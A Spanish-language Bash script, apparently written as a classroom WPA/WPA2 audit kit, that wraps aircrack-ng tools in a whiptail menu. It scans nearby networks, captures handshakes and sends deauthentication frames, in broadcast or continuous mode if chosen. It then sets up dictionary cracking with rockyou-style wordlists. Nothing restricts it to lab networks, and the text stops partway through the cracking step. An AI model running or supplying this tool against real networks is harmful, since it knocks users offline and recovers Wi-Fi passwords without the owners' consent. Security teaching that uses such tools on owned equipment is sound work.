#!/bin/bash

# =============================================================================
#  Dust_Wifi.sh — Kit de Auditoría WPA para Laboratorio de Aula
#  Propósito: Herramienta educativa para prácticas de auditoría WPA/WPA2
#  Uso: sudo bash Dust_Wifi.sh
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
# 1. VALIDACIÓN DE PRIVILEGIOS ROOT
# ─────────────────────────────────────────────────────────────────────────────
if [ "$EUID" -ne 0 ]; then
    echo ""
    echo "  [!] Error: Este script debe ejecutarse con privilegios de root."
    echo "  [*] Usa: sudo bash Dust_Wifi.sh"
    echo ""
    exit 1
fi

# Determinar el usuario real que invocó sudo (para lanzar ventanas gráficas)
USUARIO_REAL="${SUDO_USER:-$USER}"

# ─────────────────────────────────────────────────────────────────────────────
# 2. VERIFICACIÓN DE DEPENDENCIAS
# ─────────────────────────────────────────────────────────────────────────────
verificar_dependencias() {
    local FALTANTES=()
    local TOOLS=("whiptail" "iw" "ip" "airodump-ng" "aireplay-ng" "aircrack-ng" "gnome-terminal")

    for tool in "${TOOLS[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            FALTANTES+=("$tool")
        fi
    done

    if [ ${#FALTANTES[@]} -gt 0 ]; then
        echo ""
        echo "  [!] Faltan las siguientes dependencias:"
        for t in "${FALTANTES[@]}"; do
            echo "      - $t"
        done
        echo ""
        echo "  [*] Para instalar: sudo apt install aircrack-ng whiptail iw gnome-terminal"
        echo ""
        exit 1
    fi
}

verificar_dependencias

# ─────────────────────────────────────────────────────────────────────────────
# 3. DIRECTORIO DE TRABAJO ORGANIZADO POR SESIÓN
# ─────────────────────────────────────────────────────────────────────────────
SESION=$(date +"%Y-%m-%d_%H-%M")
DIR_CAPTURAS="./capturas/$SESION"
mkdir -p "$DIR_CAPTURAS"

# Variables globales del objetivo WPA (se llenan desde el escaneo - Opción 3)
# y se reutilizan automáticamente en la captura - Opción 4
BSSID_OBJETIVO=""
CANAL_OBJETIVO=""
ESSID_OBJETIVO=""

# ─────────────────────────────────────────────────────────────────────────────
# 4. LIMPIEZA Y SALIDA SEGURA (trap para Ctrl+C y salida normal)
# ─────────────────────────────────────────────────────────────────────────────
restaurar_interfaz() {
    local INTERFAZ="$1"
    if [ -n "$INTERFAZ" ]; then
        MODO_ACTUAL=$(iw dev "$INTERFAZ" info 2>/dev/null | awk '$1=="type"{print $2}')
        if [ "$MODO_ACTUAL" = "monitor" ]; then
            echo ""
            echo "  [*] Restaurando '$INTERFAZ' a modo Managed antes de salir..."
            ip link set "$INTERFAZ" down
            iw dev "$INTERFAZ" set type managed
            ip link set "$INTERFAZ" up
            systemctl restart NetworkManager 2>/dev/null
            echo "  [✓] Interfaz restaurada. Red disponible para la próxima sesión."
            echo ""
        fi
    fi
}

salida_segura() {
    local INTERFAZ="$1"
    clear
    if whiptail --title "Salir del Laboratorio" \
        --yesno "¿Deseas restaurar '$INTERFAZ' a modo Managed antes de salir?\n\n(Recomendado para dejar el equipo con red activa)" 12 60; then
        restaurar_interfaz "$INTERFAZ"
    fi
    echo "  [*] Sesión finalizada. Capturas guardadas en: $DIR_CAPTURAS"
    echo ""
    exit 0
}

# ─────────────────────────────────────────────────────────────────────────────
# 5. FUNCIÓN: LANZAR COMANDOS EN NUEVA VENTANA DE TERMINAL
# ─────────────────────────────────────────────────────────────────────────────
# Usa xterm como lanzador principal porque NO depende del D-Bus de sesión del
# usuario (a diferencia de gnome-terminal), lo que lo hace compatible con
# entornos donde el script se ejecuta con 'sudo'.
# $1 = Título de la ventana
# $2 = Comando a ejecutar
lanzar_terminal() {
    local TITULO="$1"
    local COMANDO="$2"
    local DISPLAY_VAR="${DISPLAY:-:0}"
    local XAUTH_VAR="${XAUTHORITY:-/home/$USUARIO_REAL/.Xauthority}"

    # ── Intento 1: xterm (sin D-Bus, ideal para contextos sudo) ──────────────
    if command -v xterm &>/dev/null; then
        DISPLAY="$DISPLAY_VAR" XAUTHORITY="$XAUTH_VAR" \
            xterm -title "$TITULO" \
                  -fa "Monospace" -fs 11 \
                  -bg "#1a1a2e" -fg "#e0e0e0" \
                  -geometry 120x35 \
                  -e bash -c "$COMANDO; echo ''; read -p 'Presiona Enter para cerrar esta ventana...'" &
        return 0
    fi

    # ── Intento 2: gnome-terminal con dbus-launch (fallback) ─────────────────
    if command -v gnome-terminal &>/dev/null; then
        sudo -u "$USUARIO_REAL" \
            DISPLAY="$DISPLAY_VAR" \
            XAUTHORITY="$XAUTH_VAR" \
            dbus-launch --exit-with-session \
            gnome-terminal --title="$TITULO" -- \
            bash -c "$COMANDO; echo ''; read -p 'Presiona Enter para cerrar esta ventana...'" 2>/dev/null &
        [ $? -eq 0 ] && return 0
    fi

    # ── Intento 3: xfce4-terminal (fallback adicional) ────────────────────────
    if command -v xfce4-terminal &>/dev/null; then
        DISPLAY="$DISPLAY_VAR" XAUTHORITY="$XAUTH_VAR" \
            xfce4-terminal --title="$TITULO" \
                           -e "bash -c \"$COMANDO; echo ''; read -p 'Presiona Enter para cerrar esta ventana...'\"" &
        return 0
    fi

    # ── Sin emulador disponible ───────────────────────────────────────────────
    whiptail --title "Sin Emulador de Terminal" \
        --msgbox "No se encontró ningún emulador de terminal compatible.\n\nInstala xterm con:\n  sudo apt install xterm\n\ny vuelve a ejecutar esta opción." 14 60
}

# ─────────────────────────────────────────────────────────────────────────────
# 6. FUNCIÓN: VERIFICAR MODO MONITOR (Guardián de precondición WPA)
# ─────────────────────────────────────────────────────────────────────────────
es_modo_monitor() {
    local INTERFAZ="$1"
    local MODO
    MODO=$(iw dev "$INTERFAZ" info 2>/dev/null | awk '$1=="type"{print $2}')
    [ "$MODO" = "monitor" ]
}

# ─────────────────────────────────────────────────────────────────────────────
# 7. FUNCIÓN: VALIDAR FORMATO BSSID (MAC Address)
# ─────────────────────────────────────────────────────────────────────────────
validar_bssid() {
    local MAC="$1"
    echo "$MAC" | grep -qiE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
}

# ─────────────────────────────────────────────────────────────────────────────
# 7.5 FUNCIÓN: NAVEGADOR DE ARCHIVOS TUI (para seleccionar wordlists y .cap)
# ─────────────────────────────────────────────────────────────────────────────
navegar_archivo() {
    local TITULO="$1"
    local DIR_ACTUAL="${2:-$HOME}"
    local SELECCION=""

    # Si el directorio no existe, empezar en HOME
    [ -d "$DIR_ACTUAL" ] || DIR_ACTUAL="$HOME"

    while true; do
        # Construir lista de entradas: ".." + directorios + archivos
        local ENTRADAS=()
        ENTRADAS+=(".." "⬆ Subir un nivel")

        while IFS= read -r item; do
            [ -z "$item" ] && continue
            if [ -d "$DIR_ACTUAL/$item" ]; then
                ENTRADAS+=("$item/" "📁 $item")
            else
                ENTRADAS+=("$item" "📄 $item")
            fi
        done < <(ls -A "$DIR_ACTUAL" 2>/dev/null | sort)

        SELECCION=$(whiptail --title "$TITULO" \
            --menu "Directorio actual: $DIR_ACTUAL\n\nSelecciona un archivo o navega a otra carpeta:" \
            22 78 14 \
            "${ENTRADAS[@]}" 3>&1 1>&2 2>&3)

        # Cancelar
        [ -z "$SELECCION" ] && { echo ""; return 1; }

        if [ "$SELECCION" = ".." ]; then
            DIR_ACTUAL=$(dirname "$DIR_ACTUAL")
        elif [[ "$SELECCION" == */ ]]; then
            DIR_ACTUAL="$DIR_ACTUAL/${SELECCION%/}"
        else
            # Es un archivo → devolver ruta completa
            echo "$DIR_ACTUAL/$SELECCION"
            return 0
        fi
    done
}

# ─────────────────────────────────────────────────────────────────────────────
# 8. DETECCIÓN DINÁMICA DE INTERFACES WiFi
# ─────────────────────────────────────────────────────────────────────────────
LISTA_INTERFACES=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')

if [ -z "$LISTA_INTERFACES" ]; then
    whiptail --title "Error de Hardware" \
        --msgbox "No se detectaron interfaces WiFi.\n\nConecta un adaptador USB WiFi compatible con modo monitor y vuelve a intentarlo." 12 60
    exit 1
fi

# ─────────────────────────────────────────────────────────────────────────────
# 9. MENÚ DE SELECCIÓN DE INTERFAZ (primera interfaz marcada por defecto)
# ─────────────────────────────────────────────────────────────────────────────
OPCIONES_RADIO=()
PRIMERA=true
for iface in $LISTA_INTERFACES; do
    if $PRIMERA; then
        OPCIONES_RADIO+=("$iface" "Adaptador WiFi detectado" "ON")
        PRIMERA=false
    else
        OPCIONES_RADIO+=("$iface" "Adaptador WiFi detectado" "OFF")
    fi
done

INTERFAZ=$(whiptail --title "Selección de Adaptador" \
    --radiolist "Elige la interfaz para el laboratorio WPA:\n(Usa ESPACIO para seleccionar, ENTER para confirmar)" 15 65 5 \
    "${OPCIONES_RADIO[@]}" 3>&1 1>&2 2>&3)

if [ -z "$INTERFAZ" ]; then
    clear
    echo "  [*] Operación cancelada. Saliendo..."
    exit 0
fi

# Registrar trap de salida AHORA que tenemos la interfaz definida
trap "salida_segura '$INTERFAZ'" SIGINT SIGTERM

# ─────────────────────────────────────────────────────────────────────────────
# 10. BUCLE PRINCIPAL DEL MENÚ
# ─────────────────────────────────────────────────────────────────────────────
while true; do

    # Leer el modo actual para mostrarlo en el encabezado del menú
    MODO_ACTUAL=$(iw dev "$INTERFAZ" info 2>/dev/null | awk '$1=="type"{print $2}')
    MODO_ACTUAL="${MODO_ACTUAL:-desconocido}"

    OPCION=$(whiptail --title "Dust_Wifi — Kit de Auditoría WPA | Lab: $SESION" \
        --menu "Interfaz: $INTERFAZ  |  Modo: $MODO_ACTUAL\nSelecciona una herramienta:" 25 68 10 \
        "1" "Ver estado del adaptador (iw dev info)" \
        "2" "Activar Modo Monitor" \
        "3" "Escanear redes WPA cercanas — Top 16" \
        "4" "Capturar WPA Handshake  (airodump-ng)" \
        "5" "Desautenticar Cliente    (aireplay-ng -0)" \
        "6" "Test de Inyección        (aireplay-ng --test)" \
        "7" "Revelar Clave WPA        (aircrack-ng)" \
        "8" "Restaurar Modo Managed (red normal)" \
        "9" "Salir del Laboratorio" 3>&1 1>&2 2>&3)

    case $OPCION in

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 1 — Estado del Adaptador
        # ─────────────────────────────────────────────────────────────────────
        1)
            clear
            echo "════════════════════════════════════════════"
            echo "  Estado del Adaptador: $INTERFAZ"
            echo "════════════════════════════════════════════"
            iw dev "$INTERFAZ" info
            echo ""
            echo "  Capacidades del chip (modos soportados):"
            iw phy "$(iw dev "$INTERFAZ" info | awk '$1=="wiphy"{print "phy"$2}')" info 2>/dev/null \
                | grep -A5 "Supported interface modes:" | head -8
            echo ""
            read -p "  Presiona Enter para volver al menú..."
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 2 — Activar Modo Monitor
        # ─────────────────────────────────────────────────────────────────────
        2)
            if es_modo_monitor "$INTERFAZ"; then
                whiptail --title "Modo Monitor" \
                    --msgbox "'$INTERFAZ' ya está en modo Monitor.\n\nNo es necesario activarlo nuevamente." 10 55
            else
                clear
                echo "  [*] Deteniendo servicios que interfieren con el modo monitor..."
                # Avisar a NetworkManager que gestione el adaptador en modo manual
                nmcli dev set "$INTERFAZ" managed no 2>/dev/null || true

                echo "  [*] Activando Modo Monitor en $INTERFAZ..."
                ip link set "$INTERFAZ" down
                iw dev "$INTERFAZ" set type monitor
                ip link set "$INTERFAZ" up

                ESTADO=$(iw dev "$INTERFAZ" info | awk '$1=="type"{print $2}')
                if [ "$ESTADO" = "monitor" ]; then
                    echo "  [✓] Modo Monitor activado correctamente."
                else
                    echo "  [!] Advertencia: el modo no cambió a monitor (estado: $ESTADO)."
                    echo "      Prueba desconectando y reconectando el adaptador USB."
                fi
                echo ""
                read -p "  Presiona Enter para continuar..."
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 3 — Escaneo WPA Temporizado + Menú Top 16 por Señal
        # ─────────────────────────────────────────────────────────────────────
        3)
            if ! es_modo_monitor "$INTERFAZ"; then
                whiptail --title "Precondición Requerida" \
                    --msgbox "La interfaz '$INTERFAZ' NO está en modo Monitor.\n\nPor favor ejecuta primero la Opción 2 para activar el modo Monitor antes de escanear." 12 60
            else
                # ── Duración del escaneo (segundos) ──────────────────────────
                DURACION=20
                ARCHIVO_TEMP=$(mktemp /tmp/dust_scan_XXXXXX)

                # Lanzar airodump-ng en segundo plano
                airodump-ng --encrypt WPA \
                    --output-format csv \
                    --write "$ARCHIVO_TEMP" \
                    "$INTERFAZ" &>/dev/null &
                AIRODUMP_PID=$!

                # Mostrar barra de progreso mientras escanea
                (
                    for i in $(seq 1 $DURACION); do
                        echo $(( i * 100 / DURACION ))
                        sleep 1
                    done
                ) | whiptail --title "Escaneando Redes WPA..." \
                      --gauge "  Adaptador : $INTERFAZ\n  Buscando redes WPA/WPA2 en el área...\n\n  Espera $DURACION segundos." 12 60 0

                # Detener airodump-ng
                kill "$AIRODUMP_PID" 2>/dev/null
                wait "$AIRODUMP_PID" 2>/dev/null

                # airodump-ng agrega sufijo -01 al nombre del CSV
                ARCHIVO_CSV="${ARCHIVO_TEMP}-01.csv"

                if [ ! -f "$ARCHIVO_CSV" ]; then
                    whiptail --title "Sin Resultados" \
                        --msgbox "No se generó el archivo de escaneo.\n\nVerifica que el adaptador esté en modo Monitor y vuelve a intentarlo." 10 60
                    rm -f "${ARCHIVO_TEMP}"*
                else
                    # ── Parsear CSV: extraer WPA, ordenar por señal, top 16 ──
                    # Formato CSV airodump-ng (campos separados por coma + espacios):
                    #  $1=BSSID  $4=Canal  $6=Privacy  $9=Power(dBm)  $14=ESSID
                    # Power negativo: más cercano a 0 = señal más fuerte
                    REDES_PARSED=$(awk '
                        BEGIN { FS=","; skip=0 }
                        /^Station MAC/ { skip=1 }
                        skip { next }
                        /^BSSID/       { next }
                        NF < 14        { next }
                        {
                            bssid = $1; gsub(/^[[:space:]]+|[[:space:]]+$/, "", bssid)
                            ch    = $4; gsub(/^[[:space:]]+|[[:space:]]+$/, "", ch)
                            priv  = $6; gsub(/^[[:space:]]+|[[:space:]]+$/, "", priv)
                            power = $9; gsub(/^[[:space:]]+|[[:space:]]+$/, "", power)
                            essid = $14; gsub(/^[[:space:]]+|[[:space:]]+$/, "", essid)
                            # Filtrar: solo WPA, BSSID válido, señal real (no 0)
                            if (priv ~ /WPA/ && bssid ~ /^[0-9A-Fa-f]{2}:/ && power+0 != 0) {
                                if (essid == "") essid = "(oculta)"
                                printf "%s|%s|%s|%s\n", power, ch, bssid, essid
                            }
                        }
                    ' "$ARCHIVO_CSV" | sort -t'|' -k1,1rn | head -16)

                    rm -f "${ARCHIVO_TEMP}"*

                    if [ -z "$REDES_PARSED" ]; then
                        whiptail --title "Sin Redes WPA" \
                            --msgbox "No se detectaron redes WPA/WPA2 durante el escaneo.\n\nPosibles causas:\n  • El adaptador no está correctamente en modo monitor.\n  • No hay redes WPA en el rango de cobertura.\n\nIntenta nuevamente." 14 60
                    else
                        # ── Construir opciones del menú whiptail ─────────────
                        OPCIONES_MENU=()
                        while IFS='|' read -r power ch bssid essid; do
                            # Etiqueta formateada: ESSID + canal + señal en dBm
                            LABEL=$(printf "%-22s  CH:%-4s  Señal: %s dBm" \
                                "${essid:0:22}" "$ch" "$power")
                            OPCIONES_MENU+=("$bssid" "$LABEL")
                        done <<< "$REDES_PARSED"

                        TOTAL=$(( ${#OPCIONES_MENU[@]} / 2 ))
                        ALTURA_LISTA=$(( TOTAL < 12 ? TOTAL : 12 ))

                        # ── Mostrar menú de selección ─────────────────────────
                        SELECCION=$(whiptail \
                            --title "Redes WPA Detectadas — Top $TOTAL (ordenadas por señal)" \
                            --menu "Selecciona la red objetivo para el laboratorio:\n(La mejor señal aparece primero)" \
                            $(( ALTURA_LISTA + 10 )) 72 "$ALTURA_LISTA" \
                            "${OPCIONES_MENU[@]}" 3>&1 1>&2 2>&3)

                        if [ -n "$SELECCION" ]; then
                            # Recuperar canal y ESSID del BSSID seleccionado
                            DATOS=$(echo "$REDES_PARSED" | grep "$SELECCION")
                            BSSID_OBJETIVO="$SELECCION"
                            CANAL_OBJETIVO=$(echo "$DATOS" | cut -d'|' -f2)
                            ESSID_OBJETIVO=$(echo "$DATOS" | cut -d'|' -f4)
                            SENAL_OBJETIVO=$(echo "$DATOS" | cut -d'|' -f1)

                            whiptail --title "✓ Objetivo Guardado" \
                                --msgbox "Red objetivo seleccionada y guardada:\n\n  ESSID  : $ESSID_OBJETIVO\n  BSSID  : $BSSID_OBJETIVO\n  Canal  : $CANAL_OBJETIVO\n  Señal  : $SENAL_OBJETIVO dBm\n\nAhora puedes ir directamente a la\nOpción 4 — Capturar WPA Handshake.\nEl BSSID y canal ya estarán pre-cargados." 18 60
                        fi
                    fi
                fi
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 4 — Capturar WPA Handshake (usa objetivo del escaneo si existe)
        # ─────────────────────────────────────────────────────────────────────
        4)
            if ! es_modo_monitor "$INTERFAZ"; then
                whiptail --title "Precondición Requerida" \
                    --msgbox "La interfaz '$INTERFAZ' NO está en modo Monitor.\n\nActiva primero el Modo Monitor (Opción 2)." 10 60
            else
                # ── Usar objetivo pre-seleccionado del escaneo si existe ──────
                if [ -n "$BSSID_OBJETIVO" ] && [ -n "$CANAL_OBJETIVO" ]; then
                    if whiptail --title "Objetivo Pre-cargado del Escaneo" \
                        --yesno "Se detectó un objetivo guardado del escaneo:\n\n  ESSID  : $ESSID_OBJETIVO\n  BSSID  : $BSSID_OBJETIVO\n  Canal  : $CANAL_OBJETIVO\n\n¿Deseas capturar el handshake de esta red?" 16 62; then
                        BSSID="$BSSID_OBJETIVO"
                        CANAL="$CANAL_OBJETIVO"
                    else
                        # El alumno prefiere ingresar uno diferente → limpiar objetivo
                        BSSID=""
                        CANAL=""
                        BSSID_OBJETIVO=""
                        CANAL_OBJETIVO=""
                        ESSID_OBJETIVO=""
                    fi
                fi

                # ── Si no hay objetivo pre-cargado, pedir manualmente ─────────
                if [ -z "$BSSID" ]; then
                    # Paso 4a — Solicitar BSSID con validación de formato
                    while true; do
                        BSSID=$(whiptail --title "Paso 1/2 — BSSID Objetivo" \
                            --inputbox "Ingresa la MAC (BSSID) de la red WPA objetivo:\n(Ejemplo: 00:11:22:33:44:55)\n\nTip: Usa primero la Opción 3 para escanear y\nseleccionar la red automáticamente." 14 65 3>&1 1>&2 2>&3)

                        [ -z "$BSSID" ] && break   # Cancelar

                        if validar_bssid "$BSSID"; then
                            break
                        else
                            whiptail --title "Formato Incorrecto" \
                                --msgbox "La MAC ingresada no tiene el formato correcto.\n\nFormato esperado: XX:XX:XX:XX:XX:XX\nEjemplo:          AA:BB:CC:11:22:33" 10 55
                        fi
                    done
                fi

                # ── Pedir canal si no viene pre-cargado ───────────────────────
                if [ -n "$BSSID" ] && [ -z "$CANAL" ]; then
                    while true; do
                        CANAL=$(whiptail --title "Paso 2/2 — Canal de la Red" \
                            --inputbox "Ingresa el canal (CH) de la red $BSSID:\n(Rango válido: 1–14 para 2.4 GHz | 36–165 para 5 GHz)" 10 65 3>&1 1>&2 2>&3)

                        [ -z "$CANAL" ] && break   # Cancelar

                        if echo "$CANAL" | grep -qE '^[0-9]+$' && [ "$CANAL" -ge 1 ] && [ "$CANAL" -le 165 ]; then
                            break
                        else
                            whiptail --title "Canal Inválido" \
                                --msgbox "El número de canal ingresado no es válido.\n\nIngresa un número entre 1 y 165." 9 55
                        fi
                    done
                fi

                # ── Lanzar captura si tenemos BSSID y Canal ───────────────────
                if [ -n "$BSSID" ] && [ -n "$CANAL" ]; then
                    ARCHIVO_CAP="$DIR_CAPTURAS/handshake_${BSSID//:/-}_ch${CANAL}"

                    whiptail --title "Captura WPA Handshake" \
                        --msgbox "Se abrirá la ventana de captura:\n\n  BSSID   : $BSSID\n  Canal   : $CANAL\n  Archivo : $ARCHIVO_CAP\n\nDeja esa ventana ABIERTA en segundo plano.\n\nCuando veas clientes conectados (sección STATION),\nusar la Opción 5 para enviar desautenticaciones\ny forzar la captura del handshake." 18 68

                    CMD_CAPTURA="airodump-ng -c $CANAL --bssid $BSSID -w '$ARCHIVO_CAP' $INTERFAZ"
                    lanzar_terminal "Captura WPA — $BSSID (CH:$CANAL)" "$CMD_CAPTURA"
                fi
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 5 — Desautenticar Cliente (aireplay-ng -0)
        # ─────────────────────────────────────────────────────────────────────
        5)
            if ! es_modo_monitor "$INTERFAZ"; then
                whiptail --title "Precondición Requerida" \
                    --msgbox "La interfaz '$INTERFAZ' NO está en modo Monitor.\n\nActiva primero el Modo Monitor (Opción 2)." 10 60
            else
                # ── Usar BSSID del objetivo guardado si existe ────────────────
                DEAUTH_BSSID=""
                if [ -n "$BSSID_OBJETIVO" ]; then
                    if whiptail --title "Usar Objetivo del Escaneo" \
                        --yesno "Se detectó un objetivo guardado:\n\n  ESSID  : $ESSID_OBJETIVO\n  BSSID  : $BSSID_OBJETIVO\n  Canal  : $CANAL_OBJETIVO\n\n¿Desautenticar clientes de esta red?" 14 60; then
                        DEAUTH_BSSID="$BSSID_OBJETIVO"
                    fi
                fi

                # Si no hay objetivo guardado o el alumno rechazó usarlo
                if [ -z "$DEAUTH_BSSID" ]; then
                    while true; do
                        DEAUTH_BSSID=$(whiptail --title "BSSID del AP Objetivo" \
                            --inputbox "Ingresa la MAC (BSSID) del AP al que pertenece el cliente:\n(Ejemplo: AA:BB:CC:DD:EE:FF)\n\nTip: Usa la Opción 3 para escanear y guardar\nel objetivo automáticamente." 13 65 3>&1 1>&2 2>&3)

                        [ -z "$DEAUTH_BSSID" ] && break

                        if validar_bssid "$DEAUTH_BSSID"; then
                            break
                        else
                            whiptail --title "Formato Incorrecto" \
                                --msgbox "Formato esperado: XX:XX:XX:XX:XX:XX" 7 45
                        fi
                    done
                fi

                if [ -n "$DEAUTH_BSSID" ]; then

                    # ── Solicitar MAC del cliente (Station) ──────────────────
                    STATION_MAC=$(whiptail --title "MAC del Cliente (Station)" \
                        --inputbox "Ingresa la MAC del cliente (Station) a desautenticar:\n\nEncuéntrala en la sección 'STATION' de la ventana\nde captura (airodump-ng) que tienes abierta.\n\nDeja en BLANCO para desautenticar a TODOS\nlos clientes del AP (modo broadcast)." \
                        14 68 3>&1 1>&2 2>&3)

                    # Validar MAC del cliente
                    DEAUTH_DESC=""
                    DEAUTH_CLIENT_FLAG=""
                    if [ -z "$STATION_MAC" ]; then
                        DEAUTH_DESC="TODOS los clientes del AP (broadcast)"
                        DEAUTH_CLIENT_FLAG=""
                    elif validar_bssid "$STATION_MAC"; then
                        DEAUTH_DESC="Cliente específico: $STATION_MAC"
                        DEAUTH_CLIENT_FLAG="-c $STATION_MAC"
                    else
                        whiptail --title "MAC Inválida" \
                            --msgbox "Formato de MAC incorrecto.\n\nSe usará broadcast (todos los clientes)." 9 50
                        DEAUTH_DESC="TODOS los clientes del AP (broadcast)"
                        DEAUTH_CLIENT_FLAG=""
                    fi

                    # ── Número de frames de desautenticación ─────────────────
                    while true; do
                        FRAMES=$(whiptail --title "Cantidad de Frames de Desautenticación" \
                            --inputbox "¿Cuántos frames de desautenticación enviar?\n\n  • 1–5   : Silencioso, para laboratorio controlado\n  • 10–20 : Más agresivo, mayor probabilidad de éxito\n  • 0     : Envío continuo hasta Ctrl+C\n\nValor recomendado para el laboratorio: 5" \
                            14 65 "5" 3>&1 1>&2 2>&3)

                        [ -z "$FRAMES" ] && break   # Cancelar

                        if echo "$FRAMES" | grep -qE '^[0-9]+$'; then
                            break
                        else
                            whiptail --title "Valor Inválido" \
                                --msgbox "Ingresa un número entero (0 para modo continuo)." 8 50
                        fi
                    done

                    if [ -n "$FRAMES" ]; then
                        # Etiqueta especial para modo continuo
                        FRAMES_DESC="$FRAMES frames"
                        [ "$FRAMES" -eq 0 ] && FRAMES_DESC="CONTINUO (Ctrl+C para detener)"

                        # ── Resumen y confirmación ────────────────────────────
                        if whiptail --title "Confirmar Desautenticación" \
                            --yesno "Resumen del ataque de desautenticación:\n\n  AP (BSSID) : $DEAUTH_BSSID\n  Objetivo   : $DEAUTH_DESC\n  Frames     : $FRAMES_DESC\n  Interfaz   : $INTERFAZ\n\n¿Enviar ahora?\n\nRecuerda tener la ventana de captura\n(Opción 4) abierta para ver el handshake." 20 65; then

                            clear
                            echo "════════════════════════════════════════════════════════"
                            echo "  Desautenticación WPA — aireplay-ng -0"
                            echo "════════════════════════════════════════════════════════"
                            echo "  AP (BSSID) : $DEAUTH_BSSID"
                            echo "  Objetivo   : $DEAUTH_DESC"
                            echo "  Frames     : $FRAMES_DESC"
                            echo "  Interfaz   : $INTERFAZ"
                            echo "════════════════════════════════════════════════════════"
                            echo ""
                            echo "  [*] Enviando frames de desautenticación..."
                            echo ""
                            # shellcheck disable=SC2086
                            aireplay-ng -0 "$FRAMES" -a "$DEAUTH_BSSID" $DEAUTH_CLIENT_FLAG "$INTERFAZ"
                            echo ""
                            echo "════════════════════════════════════════════════════════"
                            echo "  [✓] Desautenticación completada."
                            echo ""
                            echo "  [*] Revisa la ventana de captura:"
                            echo "      Si el cliente se reconectó verás:"
                            echo "      'WPA handshake: $DEAUTH_BSSID'"
                            echo "      en la esquina superior derecha."
                            echo ""
                            echo "  [*] Si no aparece, re-ejecuta esta opción"
                            echo "      para enviar más desautenticaciones."
                            echo "════════════════════════════════════════════════════════"
                            echo ""
                            read -p "  Presiona Enter para volver al menú..."
                        fi
                    fi
                fi
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 6 — Test de Inyección de Paquetes
        # ─────────────────────────────────────────────────────────────────────
        6)
            if ! es_modo_monitor "$INTERFAZ"; then
                whiptail --title "Precondición Requerida" \
                    --msgbox "La interfaz '$INTERFAZ' NO está en modo Monitor.\n\nActiva primero el Modo Monitor (Opción 2)." 10 60
            else
                clear
                echo "════════════════════════════════════════════"
                echo "  Test de Inyección de Paquetes — $INTERFAZ"
                echo "════════════════════════════════════════════"
                echo "  [*] Ejecutando prueba de inyección..."
                echo ""
                aireplay-ng --test "$INTERFAZ"
                echo ""
                read -p "  Presiona Enter para volver al menú..."
            fi
            ;;

        # ─────────────────────────────────────────────────────────────────────
        # OPCIÓN 7 — Revelar Clave WPA (aircrack-ng)
        # ─────────────────────────────────────────────────────────────────────
        7)
            # ── Paso 1: Seleccionar archivo .cap ──────────────────────────────
            # Buscar el .cap más reciente en el directorio de capturas
            ULTIMO_CAP=$(find "$DIR_CAPTURAS" -name "*.cap" -type f -printf '%T@ %p\n' 2>/dev/null \
                         | sort -rn | head -1 | cut -d' ' -f2-)

            ARCHIVO_CAP=""
            if [ -n "$ULTIMO_CAP" ]; then
                if whiptail --title "Archivo de Captura" \
                    --yesno "Se detectó la siguiente captura reciente:\n\n  $(basename "$ULTIMO_CAP")\n  Ruta: $ULTIMO_CAP\n\n¿Usar esta captura para revelar la clave?" 14 70; then
                    ARCHIVO_CAP="$ULTIMO_CAP"
                fi
            fi

            # Si no se usó la sugerida, navegar por el sistema de archivos
            if [ -z "$ARCHIVO_CAP" ]; then
                ARCHIVO_CAP=$(navegar_archivo "Seleccionar archivo .cap" "$DIR_CAPTURAS")
                [ -z "$ARCHIVO_CAP" ] && continue
                # Validar extensión .cap
                if [[ ! "$ARCHIVO_CAP" =~ \.cap$ ]]; then
                    whiptail --title "Archivo Inválido" \
                        --msgbox "El archivo seleccionado no tiene extensión .cap\n\nArchivo: $(basename "$ARCHIVO_CAP")" 9 60
                    continue
                fi
            fi

            # ── Paso 2: Seleccionar wordlist ──────────────────────────────────
            # Sugerir wordlists comunes si existen
            WORDLIST=""
            RUTAS_COMUNES=(
                "/usr/share/wordlists/rockyou.txt"
                "/usr/share/wordlists/rockyou.txt.gz"
                "/usr/share/wordlists/fasttrack.txt"
                "$HOME/wordlists/rockyou.txt"
                "$HOME/Descargas/rockyou.txt"
            )
            SUGERIDA=""
            for r in "${RUTAS_COMUNES[@]}"; do
                [ -f "$r" ] && { SUGERIDA="$r"; break; }
            done

            if [ -n "$SUGERIDA" ]; then
                if whiptail --title "Wordlist Detectada" \
                    --yesno "Se encontró una wordlist común:\n\n  $SUGERIDA\n\n¿Usar esta wordlist?" 12 70; then
                    WORDLIST="$SUGERIDA"
                fi
            fi

            if [ -z "$WORDLIST" ]; then
                WORDLIST=$(navegar_archivo "Seleccionar Wordlist" "/usr/share/wordlists")
                [ -z "$WORDLIST" ] && continue
            fi

            # Validar que la wordlist no esté comprimida
            if [[ "$WORDLIST" == *.gz ]]; then
                whiptail --title "Wordlist Comprimida" \
                    --msgbox "La wordlist seleccionada está comprimida (.gz).\n\nairecrack-ng no puede leerla directamente.\n\nDescomprímela primero con:\n  gunzip $WORDLIST\n\nO usa otra wordlist sin comprimir." 14 65
                continue
            fi

            # ── Paso 3: Verificar que el .cap contenga handshake válido ───────
            if ! aircrack-ng "$ARCHIVO_CAP" 2>/dev/null | grep -q "1 handshake"; then
                if ! whiptail --title "Handshake No Detectado" \
                    --yesno "No se detectó un handshake completo en el archivo .cap.\n\n  $(basename "$ARCHIVO_CAP")\n\n¿Deseas intentar de todas formas?\n(El ataque podría fallar o tardar más)" 14 70; then
                    continue
                fi
            fi

            # ── Paso 4: Extraer BSSID del nombre del archivo (si es posible) ──
            BSSID_CAP=""
            NOMBRE_BASE=$(basename "$ARCHIVO_CAP")
            if [[ "$NOMBRE_BASE" =~ handshake_([0-9A-Fa-f-]+)_ch[0-9]+ ]]; then
                BSSID_CAP=$(echo "${BASH_REMATCH[1]}" | tr '-' ':')
                validar_bssid "$BSSID_CAP" || BSSID_CAP=""
            fi

            # ── Paso 5: Confirmación y ejecución ──────────────────────────────
            local DESCRIPCION_BSSID=""
            [ -n "$BSSID_CAP" ] && DESCRIPCION_BSSID="  BSSID    : $BSSID_CAP\n"

